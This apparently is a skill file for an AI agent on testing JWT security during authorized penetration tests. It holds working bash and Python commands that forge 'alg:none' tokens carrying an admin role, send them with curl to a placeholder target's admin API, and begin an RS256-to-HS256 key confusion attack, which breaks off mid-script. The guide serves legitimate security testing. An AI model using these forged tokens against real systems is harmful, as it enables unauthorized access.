---
name: testing-jwt-token-security
description: "Assesses JWT implementations for cryptographic weaknesses. Signals: API attack, interface testing, GraphQL."
zh-signals: "Assessing JSON Web Token implementations for cryptographic weaknesses 信号:api攻击,接口测试,graphql。"
when-to-use: Assessing JSON Web Token implementations for cryptographic weaknesses,
  algorithm confusion attacks, and authorization bypass vulnerabilities during security
  engagements.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- jwt
- authentication
- web-security
- token-security
- burpsuite
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1027
---

# Testing JWT Token Security

## When to Use

- During authorized penetration tests when the application uses JWT for authentication or authorization
- When assessing API security where JWTs are passed as Bearer tokens or in cookies
- For evaluating SSO implementations that use JWT/JWS/JWE tokens
- When testing OAuth 2.0 or OpenID Connect flows that issue JWTs
- During security audits of microservice architectures using JWT for inter-service authentication

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **jwt_tool**: JWT attack toolkit (`pip install jwt_tool` or `git clone https://github.com/ticarpi/jwt_tool.git`)
- **Burp Suite Professional**: With JSON Web Token extension from BApp Store
- **Python PyJWT**: For scripting custom JWT attacks (`pip install pyjwt`)
- **Hashcat**: For brute-forcing HMAC secrets (`apt install hashcat`)
- **jq**: For JSON processing
- **Target JWT**: A valid JWT token from the application

## Workflow

### Step 1: Decode and Analyze the JWT Structure

Extract and examine the header, payload, and signature components.

```bash
# Decode JWT parts (base64url decode)
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Output: {"sub":"1234567890","name":"John Doe","iat":1516239022}

# Using jwt_tool for comprehensive analysis
python3 jwt_tool.py "$JWT"

# Check for sensitive data in the payload:
# - PII (email, phone, address)
# - Internal IDs or database references
# - Role/permission claims
# - Expiration times (exp, nbf, iat)
# - Issuer (iss) and audience (aud)
```

### Step 2: Test Algorithm None Attack

Attempt to forge tokens by setting the algorithm to "none".

```bash
# jwt_tool algorithm none attack
python3 jwt_tool.py "$JWT" -X a

# Manual none algorithm attack
# Create header: {"alg":"none","typ":"JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# Create modified payload (change role to admin)
PAYLOAD=$(echo -n '{"sub":"1234567890","name":"John Doe","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '+/' '-_')

# Construct token with empty signature
FORGED_JWT="${HEADER}.${PAYLOAD}."
echo "Forged JWT: $FORGED_JWT"

# Test the forged token
curl -s -H "Authorization: Bearer $FORGED_JWT" \
  "https://target.example.com/api/admin/users" | jq .

# Try variations: "None", "NONE", "nOnE"
for alg in none None NONE nOnE; do
  HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
  FORGED="${HEADER}.${PAYLOAD}."
  echo -n "alg=$alg: "
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $FORGED" \
    "https://target.example.com/api/admin/users"
  echo
done
```

### Step 3: Test Algorithm Confusion (RS256 to HS256)

If the server uses RS256, try switching to HS256 and signing with the public key.

```bash
# Step 1: Obtain the server's public key
# Check common locations
curl -s "https://target.example.com/.well-known/jwks.json" | jq .
curl -s "https://target.example.com/.well-known/openid-configuration" | jq .jwks_uri
curl -s "https://target.example.com/oauth/certs" | jq .

# Step 2: Extract public key from JWKS
# Save the JWKS and convert to PEM format
# Use jwt_tool or openssl

# Step 3: jwt_tool key confusion attack
python3 jwt_tool.py "$JWT" -X k -pk public_key.pem

# Manual algorithm confusion attack with Python
python3 << 'PYEOF'
import jwt
import json

# Read the server's RSA public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
